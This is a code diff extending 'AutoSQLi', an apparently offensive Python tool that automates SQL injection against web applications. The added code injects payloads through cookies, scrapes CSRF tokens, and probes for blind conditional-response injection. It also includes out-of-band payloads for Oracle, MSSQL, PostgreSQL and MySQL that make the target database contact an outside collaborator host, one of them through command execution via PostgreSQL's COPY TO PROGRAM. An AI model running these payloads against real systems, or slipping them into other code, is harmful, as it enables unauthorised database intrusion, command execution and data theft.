@@ -32,12 +32,16 @@ class AutoSQLi:
     """Automated SQL injection engine."""
 
     def __init__(self, base_url: str, param: str = "category",
-                 method: str = "GET", session=None, headers: dict = None):
+                 method: str = "GET", session=None, headers: dict = None,
+                 cookie_param: str = "", csrf_url: str = ""):
         self.base_url = base_url
         self.param = param
         self.method = method.upper()
         self.session = session or _get_session()
         self.extra_headers = headers or {}
+        self.cookie_param = cookie_param  # e.g., "TrackingId" for cookie injection
+        self.csrf_url = csrf_url  # URL to GET for CSRF token extraction
+        self.csrf_token = ""
         self.db_type = None
         self.version = None
         self.columns = 0
@@ -46,31 +50,66 @@ class AutoSQLi:
         self.waf_detected = False
         self.waf_name = ""
         self.payloads_used = []
-        self.sqli_type = None  # union, blind, error, stacked
+        self.sqli_type = None  # union, blind, error, stacked, oob
+        self.oob_domain = ""  # Burp Collaborator domain
 
     def _test_payload(self, payload: str, timeout: int = 10) -> dict:
-        """Send a payload and return response analysis."""
+        """Send a payload and return response analysis.
+
+        Supports:
+        - URL parameter injection (default)
+        - Cookie injection (if cookie_param is set)
+        - CSRF token auto-extraction (if csrf_url is set)
+        """
+        import time as _time
         try:
+            headers = dict(self.extra_headers)
+
+            # Auto-extract CSRF token if needed
+            if self.csrf_url and not self.csrf_token:
+                self._extract_csrf()
+
+            # Cookie injection mode
+            if self.cookie_param:
+                existing_cookie = headers.get("Cookie", "")
+                if existing_cookie:
+                    headers["Cookie"] = f"{existing_cookie}; {self.cookie_param}={payload}"
+                else:
+                    headers["Cookie"] = f"{self.cookie_param}={payload}"
+
+            start = _time.time()
             if self.method == "GET":
                 from urllib.parse import quote
                 url = f"{self.base_url}?{self.param}={quote(payload)}"
-                resp = self.session.get(url, headers=self.extra_headers,
+                resp = self.session.get(url, headers=headers,
                                         timeout=timeout, allow_redirects=False)
             else:
                 resp = self.session.post(self.base_url, data={self.param: payload},
-                                         headers=self.extra_headers,
+                                         headers=headers,
                                          timeout=timeout, allow_redirects=False)
+            elapsed = _time.time() - start
 
             return {
                 "status": resp.status_code,
                 "body": resp.text,
                 "length": len(resp.text),
-                "time": resp.elapsed.total_seconds() if hasattr(resp, 'elapsed') else 0,
+                "time": elapsed,
                 "is_error": resp.status_code >= 400 or "Internal Server Error" in resp.text,
                 "has_data": any(x in resp.text.lower() for x in ["product", "item", "user", "admin", "password"]),
             }
         except Exception as e:
             return {"status": 0, "error": str(e), "is_error": True, "time": 0}
+
+    def _extract_csrf(self):
+        """Extract CSRF token from login/form page."""
+        try:
+            resp = self.session.get(self.csrf_url, timeout=10)
+            import re
+            match = re.search(r'name="csrf"[^>]*value="([^"]+)"', resp.text)
+            if match:
+                self.csrf_token = match.group(1)
+        except Exception:
+            pass
 
     def detect_columns(self) -> int:
         """Detect number of columns using ORDER BY."""
@@ -357,6 +396,65 @@ class AutoSQLi:
             return {"detected": True, "name": "Unknown"}
 
         return {"detected": False}
+
+    def test_conditional_response(self, marker: str = "Welcome") -> dict:
+        """Test conditional response SQLi (check for string presence/absence).
+
+        Args:
+            marker: String to look for in response (e.g., "Welcome back")
+        """
+        # True condition
+        true_result = self._test_payload("' AND 1=1--")
+        has_marker_true = marker.lower() in true_result.get("body", "").lower()
+
+        # False condition
+        false_result = self._test_payload("' AND 1=2--")
+        has_marker_false = marker.lower() in false_result.get("body", "").lower()
+
+        if has_marker_true != has_marker_false:
+            self.sqli_type = "conditional_response"
+            return {
+                "vulnerable": True,
+                "technique": "conditional_response",
+                "marker": marker,
+                "true_has_marker": has_marker_true,
+                "false_has_marker": has_marker_false,
+            }
+
+        return {"vulnerable": False, "technique": "conditional_response"}
+
+    def test_oob(self, collaborator_domain: str = "") -> dict:
+        """Test Out-of-Band SQLi using DNS/HTTP callback.
+
+        Args:
+            collaborator_domain: Burp Collaborator domain for OOB testing
+        """
+        if not collaborator_domain:
+            collaborator_domain = self.oob_domain
+
+        if not collaborator_domain:
+            return {"vulnerable": False, "technique": "oob", "error": "No collaborator domain provided"}
+
+        oob_payloads = {
+            "oracle_utl_inaddr": f"' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{collaborator_domain}') FROM dual--",
+            "oracle_utl_http": f"' UNION SELECT UTL_HTTP.REQUEST('http://{collaborator_domain}/') FROM dual--",
+            "mssql_xp_dirtree": f"'; EXEC master..xp_dirtree '\\\\{collaborator_domain}\\a'--",
+            "postgresql_copy": f"'; COPY (SELECT '') TO PROGRAM('nslookup {collaborator_domain}')--",
+            "mysql_load_file": f"' AND LOAD_FILE('\\\\\\\\{collaborator_domain}\\\\a')--",
+        }
+
+        for db, payload in oob_payloads.items():
+            result = self._test_payload(payload)
+            if result.get("status") == 200:
+                return {
+                    "vulnerable": True,
+                    "technique": "oob",
+                    "db_type": db.split("_")[0],
+                    "payload": payload,
+                    "note": "Check Collaborator for callbacks to confirm",
+                }
+
+        return {"vulnerable": False, "technique": "oob"}
 
     def run_full_scan(self) -> dict:
         """Run complete automated SQLi scan."""
